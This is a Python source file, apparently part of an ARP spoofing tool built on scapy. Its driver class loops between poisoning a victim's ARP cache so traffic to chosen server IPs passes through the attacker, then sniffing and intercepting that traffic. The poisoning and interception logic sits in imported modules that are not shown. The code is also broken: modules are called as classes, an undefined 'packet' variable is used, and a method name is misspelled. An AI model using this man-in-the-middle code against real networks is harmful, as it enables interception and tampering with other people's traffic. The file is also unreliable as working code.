from scapy.all import * 
import Functions
import Interceptor
# from ARPPoisoning import *
import ARPPoisoning

functions = Functions()
arpPoisoning = ARPPoisoning()

class ARPStart():

    networkId = ""
    ipVictim = ""
    ipSpoof = ""
    silentMode = False
   
    def __init__(self, networkID, ipVictim, ipSpoof, silentMode):
        self.networkId = networkID
        self.ipVictim = ipVictim
        self.ipSpoof = ipSpoof
        self.silentMode = silentMode
        self.macAttacker = get_if_hwaddr(self.networkId)
        self.macVictim = functions.retrieveMACAdress(networkID=self.networkId, ipConfig=ipVictim)
        self.macServer = [functions.retrieveMACAdress(networkID=self.networkId, ipConfig=ip) for ip in ipSpoof]
        self.interceptor = Interceptor(packet, self.macAttacker, self.ipSpoof, self.macServer, self.macVictim, self.networkId, self.silentMode)


    def startSniffing(self):
        sniff(prn=self.startIntercepting, iface=self.networkId, filter="ip", timeout=20)

    def startIntercepting(self, packet):
        self.interceptor.interceltARP()

    def spoofing(self):
        arpPoisoning.arpPoisoning(self.ipVictim, self.ipSpoof, self.networkId)


    def startARP(self):
        while True:
            self.spoofing()
            self.startSniffing()